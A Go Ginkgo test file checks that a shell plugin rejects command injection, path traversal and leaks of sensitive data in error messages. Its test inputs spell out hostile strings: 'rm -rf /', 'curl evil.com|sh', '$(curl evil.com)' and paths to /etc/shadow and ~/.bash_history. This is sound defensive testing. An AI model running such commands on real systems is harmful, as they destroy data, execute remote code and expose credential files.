package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/tool-shell"
)

var _ = Describe("Shell Tool Security", func() {
	var (
		shellPlugin *main.ShellPlugin
	)

	BeforeEach(func() {
		shellPlugin = main.NewShellPlugin()
	})

	Describe("Input Validation Security", func() {
		Context("command argument validation", func() {
			It("should reject malicious shell commands", func() {
				maliciousArgs := []string{
					"; rm -rf /",
					"&& curl evil.com|sh",
					"|| malicious-command",
					"`rm -rf /`",
					"$(curl evil.com)",
					"|sh",
				}

				for _, arg := range maliciousArgs {
					err := shellPlugin.Execute("setup", []string{arg})
					Expect(err).To(HaveOccurred(),
						"Malicious argument '%s' should be rejected", arg)
				}
			})

			It("should validate shell names", func() {
				maliciousShells := []string{
					"/bin/bash; rm -rf /",
					"/bin/sh`curl evil.com`",
					"/usr/bin/zsh$(malicious)",
					"/bin/fish|sh",
				}

				for _, shell := range maliciousShells {
					err := shellPlugin.Execute("switch", []string{shell})
					Expect(err).To(HaveOccurred(),
						"Malicious shell path '%s' should be rejected", shell)
				}
			})

			It("should validate configuration paths", func() {
				maliciousPaths := []string{
					"../../../etc/passwd",
					"/etc/shadow",
					"~/../../../root/.bashrc",
					"config`rm -rf /`",
				}

				for _, path := range maliciousPaths {
					err := shellPlugin.Execute("config", []string{path})
					Expect(err).To(HaveOccurred(),
						"Malicious config path '%s' should be rejected", path)
				}
			})
		})

		Context("shell metacharacter validation", func() {
			It("should reject dangerous shell metacharacters", func() {
				dangerousChars := []string{
					";", "&", "|", "`", "$", "(", ")", "<", ">", "\\",
				}

				for _, char := range dangerousChars {
					testArg := "safe" + char + "dangerous"
					err := shellPlugin.Execute("setup", []string{testArg})
					Expect(err).To(HaveOccurred(),
						"Argument with dangerous character '%s' should be rejected", char)
				}
			})
		})
	})

	Describe("Error Message Security", func() {
		Context("error message sanitization", func() {
			It("should not leak sensitive information in error messages", func() {
				maliciousInputs := []string{
					"/etc/passwd",
					"$HOME/.bashrc",
					"/root/.profile",
					"$(whoami)",
					"~/.bash_history",
				}

				for _, input := range maliciousInputs {
					err := shellPlugin.Execute("config", []string{input})
					if err != nil {
						errorMsg := err.Error()

						// Error should not contain the raw malicious input
						Expect(errorMsg).NotTo(ContainSubstring(input),
							"Error message should not leak malicious input")

						// Error should not contain sensitive paths
						Expect(errorMsg).NotTo(ContainSubstring("/etc/passwd"))
						Expect(errorMsg).NotTo(ContainSubstring("/root/"))
						Expect(errorMsg).NotTo(ContainSubstring("bash_history"))
					}
				}
			})

			It("should sanitize command outputs in logs", func() {
				// Test that any command output doesn't contain dangerous content
				err := shellPlugin.Execute("status", []string{})

				// This might succeed or fail depending on shell state
				// but should not expose dangerous information
				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).NotTo(ContainSubstring("password"))
					Expect(errorMsg).NotTo(ContainSubstring("token"))
					Expect(errorMsg).NotTo(ContainSubstring("secret"))
				}
			})
		})
	})
})
